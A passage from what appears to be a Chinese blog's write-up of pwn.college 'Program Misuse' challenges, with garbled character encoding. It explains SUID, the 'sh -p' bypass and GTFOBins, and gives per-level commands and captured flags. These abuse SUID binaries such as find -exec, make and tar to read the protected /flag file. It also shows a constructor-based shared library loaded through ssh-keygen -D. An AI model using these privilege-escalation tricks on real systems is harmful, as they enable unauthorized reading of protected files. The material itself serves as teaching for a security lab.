href="https://gtfobins.github.io/">GTFOBins</a><br><a href="https://github.com/GTFOBins/GTFOBins.github.io">GitHub - GTFOBins/GTFOBins.github.io: GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems</a><h2 id="Lectures-and-Reading"><a href="#Lectures-and-Reading" class="headerlink" title="Lectures and Reading"></a>Lectures and Reading</h2></li></ul></li></ul><p>é€šè¿‡YouTubeè§†é¢‘å’Œslidesçš„æ–¹å¼ï¼Œè®²è§£äº†</p><ul><li>linuxå‘½ä»¤è¡Œ</li><li>æ–‡ä»¶ã€è¿›ç¨‹</li><li>è½¯ç¡¬é“¾æ¥ã€ç®¡é“</li><li>suidçš„åŸºæœ¬åŸç†</li><li>suidæ”»å‡»çš„ç¼“è§£æªæ–½</li></ul><h3 id="mitigation"><a href="#mitigation" class="headerlink" title="mitigation"></a>mitigation</h3><ul><li>eUIDï¼ˆEffective User IDï¼‰ï¼šè¡¨ç¤ºæ­£åœ¨æ‰§è¡Œå‘½ä»¤çš„è¿›ç¨‹çš„æœ‰æ•ˆç”¨æˆ·IDã€‚</li><li>rUIDï¼ˆReal User IDï¼‰ï¼šè¡¨ç¤ºæ­£åœ¨æ‰§è¡Œå‘½ä»¤çš„è¿›ç¨‹çš„çœŸå®ç”¨æˆ·IDã€‚</li></ul><p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœ<code>/bin/sh</code>è¢«è®¾ç½®ä¸ºSUIDæƒé™ï¼ˆsuidæ ‡å¿—è¢«è®¾ç½®ï¼Œå³eUIDä¸º0ä½†rUIDä¸ä¸º0ï¼‰ï¼Œå®ƒå°†é™ä½æƒé™åˆ°rUIDã€‚ä¹Ÿå°±æ˜¯è¯´ï¼ŒeUIDå°†è¢«è®¾ç½®ä¸ºrUIDçš„å€¼ï¼Œè€ŒrUIDä¸ä¸º0ã€‚</p><p>ä¸ºäº†ç¦ç”¨è¿™ç§è¡Œä¸ºï¼Œå¯ä»¥ä½¿ç”¨<code>sh -p</code>å‘½ä»¤æ¥æ‰§è¡Œ<code>/bin/sh</code>ã€‚<code>-p</code>é€‰é¡¹å°†ä½¿<code>/bin/sh</code>ä¿æŒSUIDæƒé™ï¼Œè€Œä¸ä¼šé™ä½ä¸ºrUIDã€‚</p><h2 id="Program-Misuse"><a href="#Program-Misuse" class="headerlink" title="Program Misuse"></a><a href="https://dojo.pwn.college/fundamentals/program-misuse">Program Misuse</a></h2><h3 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h3><ul><li>é¢˜ç›®åœ¨dojosé‡Œé¢</li><li>workspaceæä¾›ä¸€ä¸ªå®¹å™¨å†…çš„vscode</li></ul><p>é€šè¿‡æ‰§è¡Œæä¾›çš„/challenge/babysuidç¨‹åºï¼Œæˆ‘ä»¬å¯ä»¥å°†æŸä¸€å‘½ä»¤è®¾ç½®ä¸ºsetuidç¨‹åºï¼ˆå°½ç®¡å®ƒä¹‹å‰ä¸æ˜¯ï¼‰ã€‚æ¯”å¦‚ï¼Œåœ¨level1ä¸­ï¼Œåœ¨ä½ è¿è¡Œ/challenge/babysuidç¨‹åºåï¼Œå°±ä¼šå°†catè®¾ç½®ä¸ºsetuidç¨‹åºï¼ˆæ¯ä¸ªå®˜å¡å°†ä¸åŒçš„äºŒè¿›åˆ¶æ–‡ä»¶è®¾ç½®ä¸ºsetuidç¨‹åºï¼‰ï¼Œè¿™æ ·çš„è¯ä½ åœ¨è¿è¡Œcatçš„æ—¶å€™ä¼šå¾—åˆ°rootçš„æƒé™ï¼Œä»è€Œå¾—åˆ°/flagçš„å†…å®¹</p><p>æˆ‘ä»¬å¯ä»¥æŠŠbabysuidç¨‹åºæ”¾åˆ°idaçœ‹ä¸€ä¸‹ï¼Œå®ƒæœ¬è´¨ä¸Šæ˜¯æ‰§è¡Œäº†chmodå‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome to %s!\n\n&quot;</span>, *argv);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This challenge is part of a series of programs that&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;exposes you to very simple programs that let you directly read the flag.&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( chmod(<span class="hljs-string">&quot;/usr/bin/head&quot;</span>, <span class="hljs-number">04755u</span>) )<br>    __assert_fail(<span class="hljs-string">&quot;chmod(\&quot;/usr/bin/head\&quot;, 04755) == 0&quot;</span>, <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, <span class="hljs-number">0xD</span>u, <span class="hljs-string">&quot;main&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(byte_20DB);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;I just set the SUID bit on /usr/bin/head.&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Try to use it to read the flag!&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(byte_20DB);<br>  <span class="hljs-built_in">printf</span>(<br>    <span class="hljs-string">&quot;IMPORTANT: make sure to run me (%s) every time that you restart\n&quot;</span><br>    <span class="hljs-string">&quot;this challenge container to make sure that I set the SUID bit on /usr/bin/head!\n&quot;</span>,<br>    *argv);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ç•¥"><a href="#ç•¥" class="headerlink" title="ç•¥"></a>ç•¥</h2><ul><li>emacsçš„é€€å‡ºå‘½ä»¤ï¼šc-xï¼Œc-c</li><li>odï¼ˆoctal dumpï¼‰</li><li>hdï¼ˆhex dumpï¼‰</li><li>xxd</li></ul><h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><p>sortå°†æ–‡ä»¶çš„æ¯ä¸€è¡Œä½œä¸ºä¸€ä¸ªå•ä½ï¼Œç›¸äº’æ¯”è¾ƒï¼Œæ¯”è¾ƒåŸåˆ™æ˜¯ä»é¦–å­—ç¬¦å‘åï¼Œä¾æ¬¡æŒ‰ASCIIç å€¼è¿›è¡Œæ¯”è¾ƒï¼Œæœ€åå°†ä»–ä»¬æŒ‰å‡åºè¾“å‡º</p><p>ç”±äºflagåªæœ‰ä¸€è¡Œï¼Œå› æ­¤ç›´æ¥sortå³å¯</p><h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-built_in">rev</span> /flag | <span class="hljs-built_in">rev</span><br></code></pre></td></tr></table></figure><h2 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h2><p>base64åŒç†</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">base32 /flag | base32 -d <br>pwn.college&#123;gxSMD4Ps0hot1Rq1Zs1MNCY9f51.0lN1EDL1cTMzEzW&#125;<br></code></pre></td></tr></table></figure><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs gradle">$ tldr base32<br>base32<br>Encode or decode <span class="hljs-keyword">file</span> or standard input to<span class="hljs-regexp">/from Base32, to standard output.More information: https:/</span><span class="hljs-regexp">/www.gnu.org/</span>software<span class="hljs-regexp">/coreutils/</span>base32.<br><br> - Encode a <span class="hljs-keyword">file</span>:<br>   base32 &#123;&#123;path<span class="hljs-regexp">/to/</span><span class="hljs-keyword">file</span>&#125;&#125;<br><br> - Decode a <span class="hljs-keyword">file</span>:<br>   base32 --decode &#123;&#123;path<span class="hljs-regexp">/to/</span><span class="hljs-keyword">file</span>&#125;&#125;<br><br> - Encode <span class="hljs-keyword">from</span> stdin:<br>   &#123;&#123;somecommand&#125;&#125; | base32<br><br> - Decode <span class="hljs-keyword">from</span> stdin:<br>   &#123;&#123;somecommand&#125;&#125; | base32 --decode<br></code></pre></td></tr></table></figure><h2 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">- Split <span class="hljs-keyword">a</span> <span class="hljs-keyword">file</span> with at most <span class="hljs-number">512</span> bytes in each <span class="hljs-keyword">split</span> without breaking <span class="hljs-built_in">line</span><span class="hljs-variable">s:</span><br>  <span class="hljs-keyword">split</span> -C &#123;&#123;<span class="hljs-number">512</span>&#125;&#125; &#123;&#123;path/<span class="hljs-keyword">to</span>/<span class="hljs-keyword">file</span>&#125;&#125;<br></code></pre></td></tr></table></figure><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs applescript">hacker@program-misuse-level<span class="hljs-number">-16</span>:~$ /challenge/babysuid_level16 <br>Welcome <span class="hljs-keyword">to</span> /challenge/babysuid_level16!<br><br>This challenge <span class="hljs-keyword">is</span> part <span class="hljs-keyword">of</span> a series <span class="hljs-keyword">of</span> programs <span class="hljs-keyword">that</span><br>require you <span class="hljs-keyword">to</span> understand their output <span class="hljs-keyword">to</span> derive <span class="hljs-keyword">the</span> flag <span class="hljs-keyword">from</span> <span class="hljs-keyword">it</span>.<br><br>I just <span class="hljs-keyword">set</span> <span class="hljs-keyword">the</span> SUID bit <span class="hljs-keyword">on</span> /usr/bin/split.<br>Try <span class="hljs-keyword">to</span> use <span class="hljs-keyword">it</span> <span class="hljs-keyword">to</span> <span class="hljs-built_in">read</span> <span class="hljs-keyword">the</span> flag!<br><br>IMPORTANT: make sure <span class="hljs-keyword">to</span> <span class="hljs-built_in">run</span> <span class="hljs-keyword">me</span> (/challenge/babysuid_level16) <span class="hljs-keyword">every</span> <span class="hljs-built_in">time</span> <span class="hljs-keyword">that</span> you restart<br>this challenge container <span class="hljs-keyword">to</span> make sure <span class="hljs-keyword">that</span> I <span class="hljs-keyword">set</span> <span class="hljs-keyword">the</span> SUID bit <span class="hljs-keyword">on</span> /usr/bin/split!<br>hacker@program-misuse-level<span class="hljs-number">-16</span>:~$ split -C <span class="hljs-number">512</span> /flag<br></code></pre></td></tr></table></figure><h2 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hacker</span>@program-misuse-level-<span class="hljs-number">17</span>:~$ gzip /flag<br><span class="hljs-attribute">hacker</span>@program-misuse-level-<span class="hljs-number">17</span>:~$ gzip -dc /flag.gz <br><span class="hljs-attribute">pwn</span>.college&#123;MFi<span class="hljs-number">6</span>oRehJ<span class="hljs-number">1</span>enJ<span class="hljs-number">9</span>G<span class="hljs-number">4</span>u<span class="hljs-number">13</span>CwY<span class="hljs-number">2</span>kTwP.<span class="hljs-number">0</span>VO<span class="hljs-number">1</span>EDL<span class="hljs-number">1</span>cTMzEzW&#125;<br></code></pre></td></tr></table></figure><h2 id="level18"><a href="#level18" class="headerlink" title="level18"></a>level18</h2><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gradle">bzip2<br>A block-sorting <span class="hljs-keyword">file</span> compressor.More information: https:<span class="hljs-comment">//manned.org/bzip2.</span><br><br> - Compress a <span class="hljs-keyword">file</span>:<br>   bzip2 &#123;&#123;path<span class="hljs-regexp">/to/</span>file_to_compress&#125;&#125;<br><br> - Decompress a <span class="hljs-keyword">file</span>:<br>   bzip2 -d &#123;&#123;path<span class="hljs-regexp">/to/</span>compressed_file.bz2&#125;&#125;<br>   <br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hacker</span>@program-misuse-level-<span class="hljs-number">18</span>:~$ bzip /flag <br><span class="hljs-attribute">bash</span>: bzip: command not found<br><br><span class="hljs-attribute">hacker</span>@program-misuse-level-<span class="hljs-number">18</span>:~$ bzip<span class="hljs-number">2</span> -dc /flag.bz<span class="hljs-number">2</span> <br><span class="hljs-attribute">pwn</span>.college&#123;wyRCyHmThng<span class="hljs-number">7</span>Pg<span class="hljs-number">1</span>OX<span class="hljs-number">4</span>z<span class="hljs-number">4</span>RJWuuyx.<span class="hljs-number">0</span>FM<span class="hljs-number">2</span>EDL<span class="hljs-number">1</span>cTMzEzW&#125;<br></code></pre></td></tr></table></figure><h2 id="level19"><a href="#level19" class="headerlink" title="level19"></a>level19</h2> <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hacker</span>@program-misuse-level-<span class="hljs-number">19</span>:~$ zip /flag.zip /flag<br>  <span class="hljs-attribute">adding</span>: flag (stored <span class="hljs-number">0</span>%)<br><br><span class="hljs-attribute">hacker</span>@program-misuse-level-<span class="hljs-number">19</span>:~$ unzip -p /flag.zip <br><span class="hljs-attribute">pwn</span>.college&#123;<span class="hljs-number">0</span>R<span class="hljs-number">4</span>OhQA-x_<span class="hljs-number">5</span>UMN<span class="hljs-number">8</span>sAflvCz<span class="hljs-number">6</span>oY_<span class="hljs-number">2</span>.<span class="hljs-number">0</span>VM<span class="hljs-number">2</span>EDL<span class="hljs-number">1</span>cTMzEzW&#125;<br></code></pre></td></tr></table></figure><h2 id="level20"><a href="#level20" class="headerlink" title="level20"></a>level20</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hacker</span>@program-misuse-level-<span class="hljs-number">20</span>:~$ tar cf  flag.tar /flag <br><span class="hljs-attribute">tar</span>: Removing leading `/&#x27; from member names<br><br><span class="hljs-attribute">hacker</span>@program-misuse-level-<span class="hljs-number">20</span>:~$ tar -Oxf /flag.tar <br><span class="hljs-attribute">pwn</span>.college&#123;<span class="hljs-number">0</span>wrGqibZPayLku_gULJTTouTS-v.<span class="hljs-number">0</span>lM<span class="hljs-number">2</span>EDL<span class="hljs-number">1</span>cTMzEzW&#125;<br></code></pre></td></tr></table></figure><h2 id="level21"><a href="#level21" class="headerlink" title="level21"></a>level21</h2><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs elixir">hacker<span class="hljs-variable">@program</span>-misuse-level<span class="hljs-number">-21</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>ar rc /flag.a /flag<br><br>hacker<span class="hljs-variable">@program</span>-misuse-level<span class="hljs-number">-21</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>cat /flag.a<br>!&lt;arch&gt;<br>flag/           0           0     0     <span class="hljs-number">644</span>     <span class="hljs-number">57</span>        `<br>pwn.college&#123;E9WpzjytNHsOVvNqE00EOhYj8_e.01M2EDL1cTMzEzW&#125;<br></code></pre></td></tr></table></figure><h2 id="level22"><a href="#level22" class="headerlink" title="level22"></a>level22</h2><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml"> - Take a list of file names from standard input and add them [o]nto an archive in cpio&#x27;s binary format:</span><br><span class="xml">   echo &quot;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">file1</span>&#125;&#125;</span><span class="xml"> </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">file2</span>&#125;&#125;</span><span class="xml"> </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">file3</span>&#125;&#125;</span><span class="xml">&quot; | cpio -o</span><br><span class="xml"></span><br><span class="xml">hacker@program-misuse-level-22:~$ echo &quot;/flag&quot; | cpio -o</span><br><span class="xml">ï¿½qALï¿½Kd ï¿½9/flagpwn.college&#123;YgoO6RpYImK7IRO7shIK4vqtlfS.0FN2EDL1cTMzEzW&#125;</span><br><span class="xml">ï¿½q</span><br><span class="xml">  TRAILER!!!1 block</span><br></code></pre></td></tr></table></figure><h2 id="level23"><a href="#level23" class="headerlink" title="level23"></a>level23</h2><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mel">$ genisoimage -<span class="hljs-keyword">sort</span> <span class="hljs-string">&quot;/flag&quot;</span><br>genisoimage: Incorrect <span class="hljs-keyword">sort</span> <span class="hljs-keyword">file</span> <span class="hljs-keyword">format</span><br>        pwn.college&#123;kzc9UQAHvuDmIhGmMDx8FFy7s_Z<span class="hljs-number">.0</span>VN2EDL1cTMzEzW&#125;<br></code></pre></td></tr></table></figure><h2 id="level24"><a href="#level24" class="headerlink" title="level24"></a>level24</h2><p><code>env</code> å‘½ä»¤å¯ä»¥ç”¨äºåœ¨æ‰§è¡Œå‘½ä»¤æˆ–è„šæœ¬æ—¶è®¾ç½®ç¯å¢ƒå˜é‡ã€‚å½“ä½¿ç”¨ <code>env</code> å‘½ä»¤æ—¶ï¼Œå®ƒä¼šå°†å…¶å‚æ•°ä½œä¸ºå‘½ä»¤æˆ–è„šæœ¬çš„å‚æ•°ï¼Œå¹¶åœ¨æ‰§è¡Œè¯¥å‘½ä»¤æˆ–è„šæœ¬æ—¶è®¾ç½®ç¯å¢ƒå˜é‡ã€‚</p><p>å¦‚æœå°† <code>env</code> å‘½ä»¤ä¸å¯æ‰§è¡Œç¨‹åºä¸€èµ·ä½¿ç”¨ï¼Œåˆ™è¯¥ç¨‹åºçš„å‚æ•°å°†ä½œä¸º <code>env</code> å‘½ä»¤çš„å‚æ•°ï¼Œå¹¶ä¸” <code>env</code> å‘½ä»¤å°†è®¾ç½®ç¯å¢ƒå˜é‡å¹¶è¿è¡Œè¯¥ç¨‹åºã€‚ä¾‹å¦‚ï¼Œå‡è®¾æœ‰ä¸€ä¸ªåä¸º <code>myprogram</code> çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¹¶ä¸”éœ€è¦åœ¨è¿è¡Œè¯¥ç¨‹åºæ—¶è®¾ç½®ç¯å¢ƒå˜é‡ <code>MYVAR</code> çš„å€¼ä¸º <code>myvalue</code>ï¼Œå¯ä»¥åƒè¿™æ ·ä½¿ç”¨ <code>env</code> å‘½ä»¤ï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">env <span class="hljs-attribute">MYVAR</span>=myvalue ./myprogram<br></code></pre></td></tr></table></figure><p>è¿™å°†åœ¨è¿è¡Œ <code>myprogram</code> æ—¶è®¾ç½®ç¯å¢ƒå˜é‡ <code>MYVAR</code> çš„å€¼ä¸º <code>myvalue</code>ã€‚<code>./myprogram</code> è¡¨ç¤ºåœ¨å½“å‰ç›®å½•ä¸­æŸ¥æ‰¾ <code>myprogram</code> å¯æ‰§è¡Œæ–‡ä»¶ã€‚</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs elixir">hacker<span class="hljs-variable">@program</span>-misuse-level<span class="hljs-number">-24</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>vim <span class="hljs-number">1</span>.c <br>hacker<span class="hljs-variable">@program</span>-misuse-level<span class="hljs-number">-24</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>gcc <span class="hljs-number">1</span>.c -o readflag<br>hacker<span class="hljs-variable">@program</span>-misuse-level<span class="hljs-number">-24</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>chmod +s readflag<br>hacker<span class="hljs-variable">@program</span>-misuse-level<span class="hljs-number">-24</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>ll readflag <br>-rwsr-sr-x <span class="hljs-number">1</span> hacker hacker <span class="hljs-number">16736</span> Apr <span class="hljs-number">28</span> <span class="hljs-number">12</span><span class="hljs-symbol">:</span><span class="hljs-number">27</span> readflag*<br>hacker<span class="hljs-variable">@program</span>-misuse-level<span class="hljs-number">-24</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>env ./readflag <br>pwn.college&#123;AzBwMP3gKlrGD07PGsT5K-08ZIQ.0lN2EDL1cTMzEzW&#125;<br></code></pre></td></tr></table></figure><h2 id="level25"><a href="#level25" class="headerlink" title="level25"></a>level25</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">hacker@program-misuse-level-<span class="hljs-number">25</span>:~$ <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/find /</span> -name flag -exec cat &#123;&#125; \;<br>cat: <span class="hljs-regexp">/opt/</span>radare2<span class="hljs-regexp">/libr/</span>flag: Is a directory<br>cat: <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/share/</span>radare2<span class="hljs-regexp">/5.8.4/</span>flag: Is a directory<br>cat: <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/lib/</span>python3.<span class="hljs-number">8</span><span class="hljs-regexp">/dist-packages/</span>pwnlib/flag: Is a directory<br>pwn.college&#123;QFEr6tID0OyL1c-PbyhlCdh4gCj.<span class="hljs-number">01</span>N2EDL1cTMzEzW&#125;<br></code></pre></td></tr></table></figure><h2 id="level26"><a href="#level26" class="headerlink" title="level26"></a>level26</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> <span class="hljs-built_in">cat</span> Makefile <br>read_flag:<br>        <span class="hljs-built_in">cat</span> /flag<br><br><span class="hljs-variable">$</span> make read_flag <br><span class="hljs-built_in">cat</span> /flag<br>pwn.college&#123;MG<span class="hljs-literal">-nUq6j7A43o21RPF_4o7wfED8</span>.<span class="hljs-number">0</span>FO2EDL1cTMzEzW&#125;<br></code></pre></td></tr></table></figure><h2 id="ç•¥-1"><a href="#ç•¥-1" class="headerlink" title="ç•¥"></a>ç•¥</h2><h2 id="level-51"><a href="#level-51" class="headerlink" title="level-51"></a>level-51</h2><p>ssh-keygen -Dé€‰é¡¹å¯ä»¥åŠ è½½æŒ‡å®šçš„åŠ¨æ€é“¾æ¥åº“</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">ssh-keygen -D <span class="hljs-string">./lib_inje.so</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬éœ€è¦ç¼–è¯‘å‡ºä¸€ä¸ªåŠ¨æ€é“¾æ¥åº“ï¼Œå…¶ä¸­çš„å‡½æ•°éœ€è¦åŠ ä¸Š<code>__attribute__((constructor))</code>å…³é”®å­—ï¼Œè¿™æ ·çš„è¯ï¼ŒåŠ è½½åº“çš„æ—¶å€™å°±ä¼šè‡ªåŠ¨è¿è¡Œè¯¥å‡½æ•°ï¼Œä»è€Œè·å–setuidçš„å€¼</p><blockquote><p>å½“å°†<code>__attribute__((constructor))</code>å±æ€§åº”ç”¨äºæŸä¸ªå‡½æ•°æ—¶ï¼Œè¯¥å‡½æ•°å°†åœ¨main()å‡½æ•°ä¹‹å‰è‡ªåŠ¨è°ƒç”¨æ‰§è¡Œï¼Œè¯¥å‡½æ•°å¯ä»¥ç”¨æ¥è¿›è¡Œä¸€äº›åˆå§‹åŒ–çš„å·¥ä½œæˆ–è®¾ç½®ç­‰ã€‚è¿™ä¸ªç‰¹æ€§é€šå¸¸ç”¨äºå®ç°åœ¨ç¨‹åºè¿è¡Œæ—¶è‡ªåŠ¨åˆå§‹åŒ–æŸäº›ç‰¹å®šçš„å¯¹è±¡æˆ–å˜é‡ç­‰ã€‚<code>__attribute__((constructor))</code>å±æ€§å¯ä»¥ç”¨äºCå’ŒC++è¯­è¨€ä¸­ï¼Œä½†æ˜¯å®ƒå¹¶ä¸å±äºæ ‡å‡†C/C++ï¼Œä»…ä»…æ˜¯GCCç¼–è¯‘å™¨çš„ä¸€ä¸ªæ‰©å±•ç‰¹æ€§</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">fun</span><span class="hljs-params">()</span> __<span class="hljs-title">attribute__</span><span class="hljs-params">((constructor))</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">fun</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-comment">//ssize_t sendfile(int out_fd, int in_fd, off_t *offset, size_t count);</span><br>    <span class="hljs-comment">//int open(const char *pathname, int flags);</span><br>    sendfile(<span class="hljs-number">1</span>,open(<span class="hljs-string">&quot;/flag&quot;</span>,<span class="hljs-number">0</span>),<span class="hljs-number">0</span>,<span class="hljs-number">4096</span>);<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Windows all in oneï¼šä»é›¶å¼€å§‹çš„Windowså¿«é€Ÿé…ç½®</title>
    <link href="/p/f9220a0b/"/>
    <url>/p/f9220a0b/</url>
    
